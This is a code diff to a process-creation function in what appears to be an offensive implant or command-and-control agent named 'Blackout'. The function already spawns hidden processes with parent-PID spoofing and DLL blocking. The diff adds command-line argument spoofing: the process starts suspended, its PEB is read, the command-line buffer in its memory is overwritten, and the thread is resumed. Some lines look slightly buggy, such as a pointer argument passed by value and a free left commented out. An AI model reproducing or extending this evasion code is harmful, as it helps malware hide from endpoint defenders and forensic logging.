@@ -102,15 +102,20 @@ FUNC DWORD bkProcessCreate(
 
     UINT16 Count = 0;
 
-    PROCESS_INFORMATION Pi             = { 0 };
-    STARTUPINFOEXA      Si             = { 0 };
-    UINT64              AttrSize       = 0;
-    PVOID               AttrBuff       = NULL;
-    UINT64              Policy         = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
-    HANDLE              hParentProcess = NULL;
-
+    PROCESS_INFORMATION          Pi             = { 0 };
+    STARTUPINFOEXA               Si             = { 0 };
+    PROCESS_BASIC_INFORMATION    Pbi            = { 0 };
+    PPEB                         Peb            = bkHeapAlloc( sizeof( PEB ) );
+    PRTL_USER_PROCESS_PARAMETERS Upp            = bkHeapAlloc( sizeof( RTL_USER_PROCESS_PARAMETERS ) );
+    UINT32                       RetLen         = 0;
+    UINT64                       BytesRead      = 0;
+    UINT64                       AttrSize       = 0;
+    PVOID                        AttrBuff       = NULL;
+    UINT64                       Policy         = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+    HANDLE                       hParentProcess = NULL;
+ 
     MmZero( &Pi, sizeof( PROCESS_INFORMATION ) );
-    MmZero( &Si, sizeof( STARTUPINFOA ) );
+    MmZero( &Si, sizeof( STARTUPINFOEXA ) );
 
     Si.StartupInfo.cb          = sizeof( STARTUPINFOEXA );
     Si.StartupInfo.wShowWindow = SW_HIDE;
@@ -132,10 +137,9 @@ FUNC DWORD bkProcessCreate(
         bkProcessOpen( PROCESS_ALL_ACCESS, FALSE, Blackout().Fork.Ppid, &hParentProcess );
         Instance()->Win32.UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof( HANDLE ), NULL, 0 );
     }
+    if ( Blackout().Fork.Argue ) Flags += CREATE_SUSPENDED;
      
     if ( Blackout().Fork.Blockdlls || Blackout().Fork.Ppid || Blackout().Fork.Argue ) Si.lpAttributeList = AttrBuff;
-
-    BK_PRINT( "%d\n", Count );
 
     bCheck = Instance()->Win32.CreateProcessA( NULL, ProcCmd, NULL, NULL, InheritHandle, Flags, NULL, NULL, &Si.StartupInfo, &Pi );
     if ( !bCheck )
@@ -146,8 +150,17 @@ FUNC DWORD bkProcessCreate(
     *ThreadId      = Pi.dwThreadId;
     *ThreadHandle  = Pi.hThread;
 
+    if ( Blackout().Fork.Argue ) {
+        Instance()->Win32.NtQueryInformationProcess( Pi.hProcess, ProcessBasicInformation, &Pbi, sizeof( PROCESS_BASIC_INFORMATION ), &RetLen );
+        Instance()->Win32.ReadProcessMemory( Pi.hProcess, Pbi.PebBaseAddress, Peb, sizeof( PEB ), BytesRead );
+        Instance()->Win32.ReadProcessMemory( Pi.hProcess, Peb->ProcessParameters, Upp, sizeof( RTL_USER_PROCESS_PARAMETERS ) + 0xFF, &BytesRead );
+        Instance()->Win32.WriteProcessMemory( Pi.hProcess, Upp->CommandLine.Buffer, Blackout().Fork.Argue, StringLengthW( Blackout().Fork.Argue ) * 2 + 1, &BytesRead );
+    }
+
+    Instance()->Win32.NtResumeThread( Pi.hThread, 0 );
+
     //if ( AttrBuff ) Instance()->Win32.delet
-    if ( AttrBuff ) bkHeapFree( AttrBuff, AttrSize );
+    // if ( AttrBuff ) bkHeapFree( AttrBuff, AttrSize );
 
     return NtLastError();    
 }
